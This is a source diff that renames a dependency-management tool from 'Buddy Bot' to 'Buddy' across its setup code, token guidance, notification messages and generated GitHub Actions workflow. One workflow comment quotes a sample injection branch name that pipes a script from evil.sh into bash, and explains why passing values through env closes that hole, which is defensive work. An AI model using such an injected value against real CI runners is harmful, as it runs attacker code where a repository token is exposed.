@@ -315,7 +315,7 @@ export class ConfigurationMigrator {
       }
 
       // Dependabot has limited configuration options
-      result.warnings.push('Dependabot configuration is limited. Consider customizing Buddy Bot settings.')
+      result.warnings.push('Dependabot configuration is limited. Consider customizing Buddy settings.')
     }
     catch (error) {
       result.warnings.push(`Failed to parse Dependabot config: ${error instanceof Error ? error.message : 'Unknown error'}`)
@@ -338,7 +338,7 @@ export class ConfigurationMigrator {
   private lastRuleConversion: { incompatible: string[], warnings: string[] } = { incompatible: [], warnings: [] }
 
   /**
-   * Convert Renovate `packageRules` into buddy-bot's equivalent.
+   * Convert Renovate `packageRules` into buddy's equivalent.
    *
    * `packages.rules` is now a full target shape, so rules map across as rules
    * rather than being flattened into groups and ignores — which previously
@@ -351,7 +351,7 @@ export class ConfigurationMigrator {
     this.lastRuleConversion = { incompatible, warnings }
 
     // `enabled: false` on a name-only rule is how Renovate spells "ignore",
-    // and buddy-bot's `packages.ignore` is the more legible home for it.
+    // and buddy's `packages.ignore` is the more legible home for it.
     const ignore: string[] = []
     const remaining: PackageRule[] = []
 
@@ -527,8 +527,8 @@ export class PluginManager {
       ],
       configuration: {
         webhook_url: process.env.SLACK_WEBHOOK_URL || '',
-        channel: '#buddy-bot',
-        username: 'Buddy Bot',
+        channel: '#buddy',
+        username: 'Buddy',
       },
     }
   }
@@ -613,13 +613,13 @@ export class PluginManager {
       return
 
     const message = {
-      text: `🤖 Buddy Bot Setup Complete!`,
+      text: `🤖 Buddy Setup Complete!`,
       blocks: [
         {
           type: 'section',
           text: {
             type: 'mrkdwn',
-            text: `✅ *Buddy Bot Setup Complete*\n🔗 Repository: \`${context.repository.owner}/${context.repository.name}\`\n📊 Project Type: \`${context.analysis.type}\`\n⚙️ Package Manager: \`${context.analysis.packageManager}\``,
+            text: `✅ *Buddy Setup Complete*\n🔗 Repository: \`${context.repository.owner}/${context.repository.name}\`\n📊 Project Type: \`${context.analysis.type}\`\n⚙️ Package Manager: \`${context.analysis.packageManager}\``,
           },
         },
       ],
@@ -652,7 +652,7 @@ export class PluginManager {
     const message = {
       embeds: [
         {
-          title: '🤖 Buddy Bot Setup Complete!',
+          title: '🤖 Buddy Setup Complete!',
           color: 0x00FF00,
           fields: [
             { name: 'Repository', value: `${context.repository.owner}/${context.repository.name}`, inline: true },
@@ -694,8 +694,8 @@ export class PluginManager {
     const ticket = {
       fields: {
         project: { key: projectKey },
-        summary: `Buddy Bot Setup Complete - ${context.repository.owner}/${context.repository.name}`,
-        description: `Buddy Bot has been successfully configured for repository ${context.repository.owner}/${context.repository.name}.\n\nProject Type: ${context.analysis.type}\nPackage Manager: ${context.analysis.packageManager}\n\nSetup completed at: ${new Date().toISOString()}`,
+        summary: `Buddy Setup Complete - ${context.repository.owner}/${context.repository.name}`,
+        description: `Buddy has been successfully configured for repository ${context.repository.owner}/${context.repository.name}.\n\nProject Type: ${context.analysis.type}\nPackage Manager: ${context.analysis.packageManager}\n\nSetup completed at: ${new Date().toISOString()}`,
         issuetype: { name: 'Task' },
       },
     }
@@ -759,7 +759,7 @@ export async function runPreflightChecks(): Promise<ValidationResult> {
       .filter(file => file.endsWith('.yml') || file.endsWith('.yaml'))
 
     if (existingWorkflows.length > 0) {
-      result.warnings.push(`Found ${existingWorkflows.length} existing workflow(s). Some may conflict with Buddy Bot workflows.`)
+      result.warnings.push(`Found ${existingWorkflows.length} existing workflow(s). Some may conflict with Buddy workflows.`)
 
       // Check for conflicting dependency management tools
       const conflictingFiles = existingWorkflows.filter(file =>
@@ -961,7 +961,7 @@ export function displayProgress(progress: SetupProgress): void {
  * project that does not exist.
  *
  * @param remoteUrl - A git remote, HTTPS or SSH
- * @returns The repository, or null when the host is not one buddy-bot knows
+ * @returns The repository, or null when the host is not one buddy knows
  * @example
  * ```ts
  * parseRemote('git@gitlab.com:group/sub/repo.git')
@@ -999,7 +999,7 @@ export async function guideTokenCreation(repoInfo: RepositoryInfo): Promise<void
   getDefaultLogger().info(`\n📋 Step 1: Create the Token`)
   getDefaultLogger().info(`1. Go to https://github.com/settings/tokens`)
   getDefaultLogger().info(`2. Click "Generate new token (classic)"`)
-  getDefaultLogger().info(`3. Give it a descriptive name (e.g., "buddy-bot-${repoInfo.name}")`)
+  getDefaultLogger().info(`3. Give it a descriptive name (e.g., "buddy-${repoInfo.name}")`)
   getDefaultLogger().info(`4. Set expiration (recommended: 90 days or custom)`)
   getDefaultLogger().info(`5. Select required scopes:`)
   getDefaultLogger().info(`   ✅ repo (Full control of private repositories)`)
@@ -1012,23 +1012,23 @@ export async function guideTokenCreation(repoInfo: RepositoryInfo): Promise<void
   getDefaultLogger().info(`\n🏢 Option A: Organization Secret (Recommended for multiple repos)`)
   getDefaultLogger().info(`   - Go to: https://github.com/organizations/${repoInfo.owner}/settings/secrets/actions`)
   getDefaultLogger().info(`   - Click "New organization secret"`)
-  getDefaultLogger().info(`   - Name: BUDDY_BOT_TOKEN`)
+  getDefaultLogger().info(`   - Name: BUDDY_TOKEN`)
   getDefaultLogger().info(`   - Value: your_generated_token`)
   getDefaultLogger().info(`   - Repository access: Selected repositories or All repositories`)
 
   getDefaultLogger().info(`\n📦 Option B: Repository Secret (For this repository only)`)
   getDefaultLogger().info(`   - Go to: https://github.com/${repoInfo.owner}/${repoInfo.name}/settings/secrets/actions`)
   getDefaultLogger().info(`   - Click "New repository secret"`)
-  getDefaultLogger().info(`   - Name: BUDDY_BOT_TOKEN`)
+  getDefaultLogger().info(`   - Name: BUDDY_TOKEN`)
   getDefaultLogger().info(`   - Value: your_generated_token`)
   getDefaultLogger().info(`   - Click "Add secret"`)
 
-  getDefaultLogger().info(`\n💡 The workflows will automatically use BUDDY_BOT_TOKEN if available, otherwise fall back to GITHUB_TOKEN`)
+  getDefaultLogger().info(`\n💡 The workflows will automatically use BUDDY_TOKEN if available, otherwise fall back to GITHUB_TOKEN`)
 }
 
 export async function confirmTokenSetup(): Promise<{ hasCustomToken: boolean, needsGuide: boolean }> {
   getDefaultLogger().info('\n🔑 GitHub Token Configuration:')
-  getDefaultLogger().info('Buddy Bot can work with:')
+  getDefaultLogger().info('Buddy can work with:')
   getDefaultLogger().info('  • Organization secrets (GITHUB_TOKEN or custom PAT)')
   getDefaultLogger().info('  • Repository secrets (custom PAT)')
   getDefaultLogger().info('  • Default GITHUB_TOKEN (limited permissions)')
@@ -1082,18 +1082,18 @@ export async function guideRepositorySettings(repoInfo: RepositoryInfo): Promise
   getDefaultLogger().info(`   ✅ Select "Read and write permissions"`)
   getDefaultLogger().info(`   ✅ Check "Allow GitHub Actions to create and approve pull requests"`)
   getDefaultLogger().info(`3. Click "Save"`)
-  getDefaultLogger().info(`4. This allows Buddy Bot to create PRs and update issues.\n`)
+  getDefaultLogger().info(`4. This allows Buddy to create PRs and update issues.\n`)
 }
 
 export async function generateConfigFile(repoInfo: RepositoryInfo, hasCustomToken: boolean): Promise<void> {
-  const configContent = `import type { BuddyBotConfig } from 'buddy-bot'
+  const configContent = `import type { BuddyConfig } from '@buddysh/buddy'
 
-const config: BuddyBotConfig = {
+const config: BuddyConfig = {
   repository: {
     owner: '${repoInfo.owner}',
     name: '${repoInfo.name}',
     provider: '${repoInfo.provider ?? 'github'}',
-    ${hasCustomToken ? '// token: process.env.BUDDY_BOT_TOKEN,' : '// Uses GITHUB_TOKEN by default'}
+    ${hasCustomToken ? '// token: process.env.BUDDY_TOKEN,' : '// Uses GITHUB_TOKEN by default'}
   },
   dashboard: {
     enabled: true,
@@ -1127,10 +1127,10 @@ const config: BuddyBotConfig = {
 export default config
 `
 
-  const configPath = 'buddy-bot.config.ts'
+  const configPath = 'buddy.config.ts'
   fs.writeFileSync(configPath, configContent)
   getDefaultLogger().info(`✅ Created ${configPath} with your repository settings.`)
-  getDefaultLogger().info(`💡 You can edit this file to customize Buddy Bot's behavior.`)
+  getDefaultLogger().info(`💡 You can edit this file to customize Buddy's behavior.`)
   getDefaultLogger().info(`🔧 The TypeScript config provides better IntelliSense and type safety.\n`)
 }
 
@@ -1154,7 +1154,7 @@ function generateComposerSetupSteps(): string {
 }
 
 export function generateUnifiedWorkflow(_hasCustomToken: boolean): string {
-  return `name: Buddy Bot
+  return `name: Buddy
 
 on:
   # Rebase checkbox: fires instantly when a PR body is edited (e.g. checkbox ticked).
@@ -1173,7 +1173,7 @@ on:
   issues:
     types: [edited, opened]
 
-  # @buddy-bot commands. The guard below terminates in seconds for the
+  # @buddy commands. The guard below terminates in seconds for the
   # overwhelming majority of comments, which never mention the bot, so ordinary
   # discussion costs no meaningful Actions time.
   issue_comment:
@@ -1182,7 +1182,7 @@ on:
   pull_request_review_comment:
     types: [created]
 
-  # Repair a failing run on a buddy-bot pull request.
+  # Repair a failing run on a buddy pull request.
   workflow_run:
     types: [completed]
 
@@ -1259,10 +1259,10 @@ on:
 env:
   # Use the built-in GITHUB_TOKEN for commits and PRs — contributions are attributed
   # to github-actions[bot] instead of a personal account.
-  # BUDDY_BOT_TOKEN (a PAT with 'repo' and 'workflow' scopes) is only used when
+  # BUDDY_TOKEN (a PAT with 'repo' and 'workflow' scopes) is only used when
   # workflow file updates are needed. Create one at: https://github.com/settings/tokens
   GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
-  BUDDY_BOT_TOKEN: \${{ secrets.BUDDY_BOT_TOKEN }}
+  BUDDY_TOKEN: \${{ secrets.BUDDY_TOKEN }}
 
 permissions:
   contents: write
@@ -1276,7 +1276,7 @@ permissions:
 # on the same branches/PRs. cancel-in-progress: false lets the currently
 # running job finish cleanly instead of being killed mid-commit.
 concurrency:
-  group: buddy-bot-\${{ github.ref }}
+  group: buddy-\${{ github.ref }}
   cancel-in-progress: false
 
 jobs:
@@ -1296,7 +1296,7 @@ jobs:
         id: determine
         # A PR branch name is attacker-chosen text. Interpolated straight into
         # the script below, a branch called \`x";curl evil.sh|bash;"\` executed
-        # in the runner — and this workflow carries BUDDY_BOT_TOKEN (a PAT with
+        # in the runner — and this workflow carries BUDDY_TOKEN (a PAT with
         # repo and workflow scopes) in its environment, which a same-repo PR
         # does receive. Passing these through \`env\` keeps them as shell values
         # that are never parsed as script.
@@ -1324,20 +1324,20 @@ jobs:
               echo "ℹ️ Pull request \${{ github.event.action }} — reviewing"
             fi
           elif [ "\${{ github.event_name }}" = "pull_request" ]; then
-            # PR body was edited — check if it's a buddy-bot PR with rebase checkbox
+            # PR body was edited — check if it's a buddy PR with rebase checkbox
             # Only run the check job (lightweight: just scans for the checkbox and rebases)
             ACTOR="\$PR_ACTOR"
             BRANCH="\$PR_BRANCH"
 
             # Skip if the edit was made by a bot (prevents cascade loops where
-            # buddy-bot updates a PR body → fires edited event → re-triggers workflow)
-            if [[ "\$ACTOR" == *"[bot]"* ]] || [[ "\$ACTOR" == "github-actions[bot]" ]] || [[ "\$ACTOR" == "buddy-bot" ]]; then
+            # buddy updates a PR body → fires edited event → re-triggers workflow)
+            if [[ "\$ACTOR" == *"[bot]"* ]] || [[ "\$ACTOR" == "github-actions[bot]" ]] || [[ "\$ACTOR" == "buddy" ]]; then
               echo "ℹ️ Skipping — PR edit was made by bot actor: \$ACTOR"
-            elif [[ "\$BRANCH" == buddy-bot/* ]]; then
+            elif [[ "\$BRANCH" == buddy/* ]]; then
               echo "run_check=true" >> \$GITHUB_OUTPUT
-              echo "ℹ️ buddy-bot PR edited by user — running rebase check for branch: \$BRANCH"
+              echo "ℹ️ buddy PR edited by user — running rebase check for branch: \$BRANCH"
             else
-              echo "ℹ️ Non-buddy-bot PR edited — skipping (branch: \$BRANCH)"
+              echo "ℹ️ Non-buddy PR edited — skipping (branch: \$BRANCH)"
             fi
           elif [ "\${{ github.event_name }}" = "issues" ]; then
             # Dashboard issue edited — a maintainer may have ticked a rebase or
@@ -1347,7 +1347,7 @@ jobs:
 
             # The bot unticks handled boxes, which edits the issue. Without this
             # guard that edit would re-trigger the workflow in a loop.
-            if [[ "\$ACTOR" == *"[bot]"* ]] || [[ "\$ACTOR" == "github-actions[bot]" ]] || [[ "\$ACTOR" == "buddy-bot" ]]; then
+            if [[ "\$ACTOR" == *"[bot]"* ]] || [[ "\$ACTOR" == "github-actions[bot]" ]] || [[ "\$ACTOR" == "buddy" ]]; then
               echo "ℹ️ Skipping — issue edit was made by bot actor: \$ACTOR"
             elif [[ "\$TITLE" == *"Dependency Dashboard"* ]]; then
               echo "run_check=true" >> \$GITHUB_OUTPUT
@@ -1359,11 +1359,11 @@ jobs:
             # Only act on our own failing runs; a green run has nothing to fix.
             if [ "\${{ github.event.workflow_run.conclusion }}" != "failure" ]; then
               echo "ℹ️ Run did not fail — nothing to fix"
-            elif [[ "\${{ github.event.workflow_run.head_branch }}" == buddy-bot/* ]]; then
+            elif [[ "\${{ github.event.workflow_run.head_branch }}" == buddy/* ]]; then
               echo "run_fixci=true" >> \$GITHUB_OUTPUT
-              echo "ℹ️ Failing run on a buddy-bot branch — attempting a fix"
+              echo "ℹ️ Failing run on a buddy branch — attempting a fix"
             else
-              echo "ℹ️ Failing run on a non-buddy-bot branch — skipping"
+              echo "ℹ️ Failing run on a non-buddy branch — skipping"
             fi
           elif [ "\${{ github.event_name }}" = "issue_comment" ] || [ "\${{ github.event_name }}" = "pull_request_review_comment" ]; then
             # Cheap pre-filter: no mention, no work. This is the guard that
@@ -1373,11 +1373,11 @@ jobs:
 
             if [[ "\$ACTOR" == *"[bot]"* ]] || [[ "\$ACTOR" == "github-actions[bot]" ]]; then
               echo "ℹ️ Skipping — comment written by bot actor: \$ACTOR"
-            elif [[ "\$BODY" == *"@buddy-bot"* ]]; then
+            elif [[ "\$BODY" == *"@buddy"* ]]; then
               echo "run_command=true" >> \$GITHUB_OUTPUT
-              echo "ℹ️ Comment mentions buddy-bot — handling command"
+              echo "ℹ️ Comment mentions buddy — handling command"
             else
-              echo "ℹ️ Comment does not mention buddy-bot — skipping"
+              echo "ℹ️ Comment does not mention buddy — skipping"
             fi
           elif [ "\${{ github.event_name }}" = "workflow_dispatch" ]; then
             JOB="\${{ github.event.inputs.job || 'all' }}"
@@ -1426,7 +1426,7 @@ ${generateComposerSetupSteps()}
           git config --global user.name "github-actions[bot]"
           git config --global user.email "github-actions[bot]@users.noreply.github.com"
 
-  # Handle an @buddy-bot command from a comment
+  # Handle an @buddy command from a comment
   command:
     runs-on: ubuntu-latest
     timeout-minutes: 20
@@ -1447,7 +1447,7 @@ ${generateComposerSetupSteps()}
         run: bun install
 
       - name: Handle command
-        run: bunx buddy-bot handle-comment --verbose
+        run: bunx @buddysh/buddy handle-comment --verbose
         env:
           GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
           ANTHROPIC_API_KEY: \${{ secrets.ANTHROPIC_API_KEY }}
@@ -1477,7 +1477,7 @@ ${generateComposerSetupSteps()}
         run: bun install
 
       - name: Run gates
-        run: bunx buddy-bot gate \${{ github.event.pull_request.number }} --verbose
+        run: bunx @buddysh/buddy gate \${{ github.event.pull_request.number }} --verbose
 
   # Finishing touches, when a maintainer ticks one on a pull request.
   touch:
@@ -1500,7 +1500,7 @@ ${generateComposerSetupSteps()}
         run: bun install
 
       - name: Run finishing touches
-        run: bunx buddy-bot touch \${{ github.event.pull_request.number }} --verbose
+        run: bunx @buddysh/buddy touch \${{ github.event.pull_request.number }} --verbose
 
   # Post-merge actions. Guarded on the merged flag, because the closed action
   # also fires for a pull request somebody abandoned.
@@ -1523,7 +1523,7 @@ ${generateComposerSetupSteps()}
         run: bun install
 
       - name: Run post-merge actions
-        run: bunx buddy-bot post-merge \${{ github.event.pull_request.number }} --verbose
+        run: bunx @buddysh/buddy post-merge \${{ github.event.pull_request.number }} --verbose
 
   # Quick-links on a new issue, and the actions a maintainer ticks there.
   issue-links:
@@ -1543,7 +1543,7 @@ ${generateComposerSetupSteps()}
         run: bun install
 
       - name: Handle issue
-        run: bunx buddy-bot handle-issue --verbose
+        run: bunx @buddysh/buddy handle-issue --verbose
 
   # Weekly dependency-health report.
   report:
@@ -1565,7 +1565,7 @@ ${generateComposerSetupSteps()}
         run: bun install
 
       - name: Generate report
-        run: bunx buddy-bot report --publish --verbose
+        run: bunx @buddysh/buddy report --publish --verbose
 
   # Review a pull request on open, ready-for-review, or push
   review:
@@ -1590,7 +1590,7 @@ ${generateComposerSetupSteps()}
       # Skips itself when ai.review.enabled is false, so adding the trigger
       # does not turn reviews on by itself.
       - name: Review pull request
-        run: bunx buddy-bot review \${{ github.event.pull_request.number }} --verbose
+        run: bunx @buddysh/buddy review \${{ github.event.pull_request.number }} --verbose
         env:
           GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
           ANTHROPIC_API_KEY: \${{ secrets.ANTHROPIC_API_KEY }}
@@ -1598,7 +1598,7 @@ ${generateComposerSetupSteps()}
           GOOGLE_API_KEY: \${{ secrets.GOOGLE_API_KEY }}
           OPENROUTER_API_KEY: \${{ secrets.OPENROUTER_API_KEY }}
 
-  # Diagnose and repair a failing run on a buddy-bot branch
+  # Diagnose and repair a failing run on a buddy branch
   fix-ci:
     runs-on: ubuntu-latest
     timeout-minutes: 30
@@ -1621,7 +1621,7 @@ ${generateComposerSetupSteps()}
         run: bun install
 
       - name: Attempt a fix
-        run: bunx buddy-bot fix-ci --run-id \${{ github.event.workflow_run.id }} --verbose
+        run: bunx @buddysh/buddy fix-ci --run-id \${{ github.event.workflow_run.id }} --verbose
         env:
           GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
           ANTHROPIC_API_KEY: \${{ secrets.ANTHROPIC_API_KEY }}
@@ -1657,14 +1657,14 @@ ${generateComposerSetupSteps()}
 
       - name: Check token permissions
         run: |
-          if [ -z "\${{ secrets.BUDDY_BOT_TOKEN }}" ]; then
+          if [ -z "\${{ secrets.BUDDY_TOKEN }}" ]; then
             echo "⚠️ Using GITHUB_TOKEN (limited permissions)"
             echo "💡 For full workflow file update support:"
             echo "   1. Create a Personal Access Token with 'repo' and 'workflow' scopes"
-            echo "   2. Add it as repository secret 'BUDDY_BOT_TOKEN'"
+            echo "   2. Add it as repository secret 'BUDDY_TOKEN'"
             echo "   3. Re-run this workflow"
           else
-            echo "✅ Using BUDDY_BOT_TOKEN (full permissions)"
+            echo "✅ Using BUDDY_TOKEN (full permissions)"
           fi
 
       - name: Check for PRs that need attention
@@ -1682,15 +1682,15 @@ ${generateComposerSetupSteps()}
 
           if [ "\${{ github.event.inputs.dry_run }}" = "true" ]; then
             echo "📋 Running in DRY RUN mode..."
-            bunx buddy-bot update-check --dry-run --verbose
+            bunx @buddysh/buddy update-check --dry-run --verbose
           else
             echo "🔄 Running in LIVE mode..."
-            bunx buddy-bot update-check --verbose
+            bunx @buddysh/buddy update-check --verbose
           fi
 
         env:
           GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
-          BUDDY_BOT_TOKEN: \${{ secrets.BUDDY_BOT_TOKEN }}
+          BUDDY_TOKEN: \${{ secrets.BUDDY_TOKEN }}
 
       - name: Create check summary
         if: always()
@@ -1739,7 +1739,7 @@ ${generateComposerSetupSteps()}
 
       - name: Display update configuration
         run: |
-          echo "🧪 **Buddy Bot Update Mode**"
+          echo "🧪 **Buddy Update Mode**"
           echo "Strategy: \${{ github.event.inputs.strategy || 'patch' }}"
           echo "Dry Run: \${{ github.event.inputs.dry_run || 'false' }}"
           echo "Packages: \${{ github.event.inputs.packages || 'all' }}"
@@ -1763,21 +1763,21 @@ ${generateComposerSetupSteps()}
 
           if [ "\$PACKAGES" != "" ]; then
             if [ "\$VERBOSE" = "true" ]; then
-              bunx buddy-bot update --packages "\$PACKAGES" --verbose
+              bunx @buddysh/buddy update --packages "\$PACKAGES" --verbose
             else
-              bunx buddy-bot update --packages "\$PACKAGES"
+              bunx @buddysh/buddy update --packages "\$PACKAGES"
             fi
           else
             if [ "\$VERBOSE" = "true" ]; then
-              bunx buddy-bot update --strategy "\$STRATEGY" --verbose
+              bunx @buddysh/buddy update --strategy "\$STRATEGY" --verbose
             else
-              bunx buddy-bot update --strategy "\$STRATEGY"
+              bunx @buddysh/buddy update --strategy "\$STRATEGY"
             fi
           fi
 
         env:
           GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
-          BUDDY_BOT_TOKEN: \${{ secrets.BUDDY_BOT_TOKEN }}
+          BUDDY_TOKEN: \${{ secrets.BUDDY_TOKEN }}
 
       - name: Dry run notification
         if: \${{ github.event.inputs.dry_run == 'true' }}
@@ -1830,7 +1830,7 @@ ${generateComposerSetupSteps()}
 
       - name: Display dashboard configuration
         run: |
-          echo "📊 **Buddy Bot Dashboard Management**"
+          echo "📊 **Buddy Dashboard Management**"
           echo "Pin Dashboard: \${{ github.event.inputs.pin || 'true' }}"
           echo "Custom Title: \${{ github.event.inputs.title || 'default' }}"
           echo "Issue Number: \${{ github.event.inputs.issue_number || 'auto-detect' }}"
@@ -1854,7 +1854,7 @@ ${generateComposerSetupSteps()}
               echo "⚠️ WARNING: Multiple dashboard issues detected!"
               gh issue list --label "dashboard,dependencies" --state open --json number,title,url --jq '.[] | "  - #\\(.number): \\(.title) - \\(.url)"' 2>/dev/null || true
               echo ""
-              echo "🔧 Buddy Bot will attempt to update the most recent one and may close duplicates"
+              echo "🔧 Buddy will attempt to update the most recent one and may close duplicates"
             elif [ "\$EXISTING_DASHBOARDS" -eq 1 ]; then
               DASHBOARD_INFO=\$(gh issue list --label "dashboard,dependencies" --state open --json number,title,url --jq '.[0] | "#\\(.number): \\(.title) - \\(.url)"' 2>/dev/null || echo "Found 1 dashboard")
               echo "✅ Found existing dashboard: \$DASHBOARD_INFO"
@@ -1884,7 +1884,7 @@ ${generateComposerSetupSteps()}
           set -e  # Exit on any error
 
           # Build the command
-          COMMAND="bunx buddy-bot dashboard"
+          COMMAND="bunx @buddysh/buddy dashboard"
 
           if [ "\$TITLE" != "" ]; then
             COMMAND="\$COMMAND --title \\"\$TITLE\\""
@@ -1913,9 +1913,9 @@ ${generateComposerSetupSteps()}
             # Run scan to show what would be included
             echo "🔍 Scanning for dependencies that would be included:"
             if [ "\$VERBOSE" = "true" ]; then
-              bunx buddy-bot scan --verbose
+              bunx @buddysh/buddy scan --verbose
             else
-              bunx buddy-bot scan
+              bunx @buddysh/buddy scan
             fi
           else
             echo "🚀 Executing dashboard update:"
@@ -1926,7 +1926,7 @@ ${generateComposerSetupSteps()}
 
         env:
           GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
-          BUDDY_BOT_TOKEN: \${{ secrets.BUDDY_BOT_TOKEN }}
+          BUDDY_TOKEN: \${{ secrets.BUDDY_TOKEN }}
 
       - name: Dry run notification
         if: \${{ github.event.inputs.dry_run == 'true' }}
@@ -2013,8 +2013,8 @@ export async function generateCoreWorkflows(_preset: WorkflowPreset, _repoInfo: 
 
   // Generate unified workflow that combines all three previous workflows
   const unifiedWorkflow = generateUnifiedWorkflow(hasCustomToken)
-  fs.writeFileSync(path.join(outputDir, 'buddy-bot.yml'), unifiedWorkflow)
-  logger.info('Generated unified buddy-bot workflow (combines check, update, and dashboard)')
+  fs.writeFileSync(path.join(outputDir, 'buddy.yml'), unifiedWorkflow)
+  logger.info('Generated unified buddy workflow (combines check, update, and dashboard)')
 
   // Generate the security-audit workflow alongside. Lives as its own
   // file so it runs (and triggers on workflow path filters) independently
@@ -2209,9 +2209,9 @@ export async function validateWorkflowGeneration(workflowContent: string): Promi
     result.warnings.push('Workflow permissions not explicitly defined. This may cause issues.')
   }
 
-  // Check for required buddy-bot steps
-  if (!workflowContent.includes('bunx buddy-bot')) {
-    result.errors.push('Workflow missing buddy-bot execution commands')
+  // Check for required buddy steps
+  if (!workflowContent.includes('bunx @buddysh/buddy')) {
+    result.errors.push('Workflow missing buddy execution commands')
     result.success = false
   }
 
@@ -2232,9 +2232,9 @@ export async function validateRepositoryAccess(repoInfo: RepositoryInfo): Promis
     // sends users chasing a typo that isn't there.
     const headers: Record<string, string> = {
       'Accept': 'application/vnd.github.v3+json',
-      'User-Agent': 'buddy-bot',
+      'User-Agent': 'buddy',
     }
-    const token = process.env.BUDDY_BOT_TOKEN || process.env.GITHUB_TOKEN || process.env.GH_TOKEN
+    const token = process.env.BUDDY_TOKEN || process.env.GITHUB_TOKEN || process.env.GH_TOKEN
     if (token)
       headers.Authorization = `Bearer ${token}`
 
@@ -2426,21 +2426,21 @@ export async function setupCustomWorkflow(preset: WorkflowPreset, _logger: Logge
 }
 
 export async function showFinalInstructions(repoInfo: RepositoryInfo, hasCustomToken: boolean): Promise<void> {
-  getDefaultLogger().info('✅ Generated unified buddy-bot workflow in .github/workflows/:')
-  getDefaultLogger().info(`   - buddy-bot.yml (Combined check, update, and dashboard management)`)
-  getDefaultLogger().info(`📁 Configuration file: buddy-bot.config.ts`)
+  getDefaultLogger().info('✅ Generated unified buddy workflow in .github/workflows/:')
+  getDefaultLogger().info(`   - buddy.yml (Combined check, update, and dashboard management)`)
+  getDefaultLogger().info(`📁 Configuration file: buddy.config.ts`)
 
   getDefaultLogger().info(`\n🚀 Next Steps:`)
   getDefaultLogger().info(`1. Review and commit the generated workflow files`)
-  getDefaultLogger().info(`   git add .github/workflows/ buddy-bot.config.ts`)
-  getDefaultLogger().info(`   git commit -m "Add Buddy Bot dependency management workflows"`)
+  getDefaultLogger().info(`   git add .github/workflows/ buddy.config.ts`)
+  getDefaultLogger().info(`   git commit -m "Add Buddy dependency management workflows"`)
   getDefaultLogger().info(`   git push`)
 
   if (hasCustomToken) {
     getDefaultLogger().info(`\n2. 🔑 Complete your token setup:`)
     getDefaultLogger().info(`   ✅ Your Personal Access Token should be configured as:`)
-    getDefaultLogger().info(`      • Organization secret: BUDDY_BOT_TOKEN (recommended), or`)
-    getDefaultLogger().info(`      • Repository secret: BUDDY_BOT_TOKEN`)
+    getDefaultLogger().info(`      • Organization secret: BUDDY_TOKEN (recommended), or`)
+    getDefaultLogger().info(`      • Repository secret: BUDDY_TOKEN`)
     getDefaultLogger().info(`   💡 The workflows will automatically detect and use your token`)
   }
   else {
